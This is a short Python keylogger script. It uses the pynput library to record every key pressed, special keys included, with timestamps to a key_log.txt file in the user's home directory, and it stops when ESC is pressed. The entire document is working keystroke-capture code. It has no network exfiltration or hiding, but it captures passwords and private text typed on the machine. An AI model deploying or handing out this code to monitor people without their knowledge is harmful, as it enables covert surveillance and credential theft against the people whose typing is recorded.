import os
import logging
from pynput import keyboard

# Define the log file path
log_file_path = os.path.expanduser("~") + "/key_log.txt"

# Configure logging
logging.basicConfig(
    filename=log_file_path,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)

# Function to log keys
def on_press(key):
    try:
        # Log alphanumeric keys directly
        logging.info(f"{key.char}")
    except AttributeError:
        # Log special keys
        logging.info(f"[{key}]")

# Function to handle the release of keys (optional)
def on_release(key):
    # Stop the keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        return False

# Listener to capture key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
